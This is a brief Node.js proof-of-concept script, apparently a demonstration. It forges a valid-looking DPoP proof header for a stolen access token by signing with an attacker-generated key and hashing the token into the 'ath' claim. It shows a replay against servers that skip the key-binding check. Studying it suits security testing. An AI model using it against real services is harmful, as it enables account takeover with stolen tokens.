// What an attacker can do with a stolen token: sign a perfectly valid DPoP proof... with their own key.
// Usage: node attacker-proof.mjs <METHOD> <URL> [token-file]   (prints a DPoP header value)
import { generateKeyPairSync, createHash, sign } from "node:crypto";
import { readFileSync } from "node:fs";
import { randomUUID } from "node:crypto";

const [htm, htu, tokenFile] = process.argv.slice(2);
const { privateKey, publicKey } = generateKeyPairSync("ec", { namedCurve: "P-256" });
const { kty, crv, x, y } = publicKey.export({ format: "jwk" });
const b64 = (o) => Buffer.from(JSON.stringify(o)).toString("base64url");
const payload = { jti: randomUUID(), htm, htu, iat: Math.floor(Date.now() / 1000) };
if (tokenFile) payload.ath = createHash("sha256").update(readFileSync(tokenFile, "utf8").trim()).digest("base64url");
const input = `${b64({ typ: "dpop+jwt", alg: "ES256", jwk: { kty, crv, x, y } })}.${b64(payload)}`;
console.log(`${input}.${sign("sha256", Buffer.from(input), { key: privateKey, dsaEncoding: "ieee-p1363" }).toString("base64url")}`);
